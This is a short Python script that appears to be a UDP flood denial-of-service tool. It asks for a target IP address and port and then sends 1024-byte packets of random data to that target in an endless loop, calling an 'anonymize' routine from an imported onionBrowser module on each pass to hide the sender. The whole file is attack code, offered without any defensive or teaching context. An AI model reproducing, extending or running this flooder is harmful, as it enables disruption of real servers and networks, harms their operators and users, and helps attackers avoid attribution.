import socket
import random
from onionBrowser import *

ab = onionBrowser(proxies = [],\
        user_agents=[('User-agents','superSecretBrowser')])

sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes = random._urandom(1024)
ip = input('Target IP: ')
port = input('Target Port: ')
port = int(port)
sent = 1
while 1:
    ab.anonymize()
    sock.sendto(bytes,(ip,port)) 
    sent = sent+1
    print("Sent %s amount of packets to %s at port %s." %(sent,ip,port))


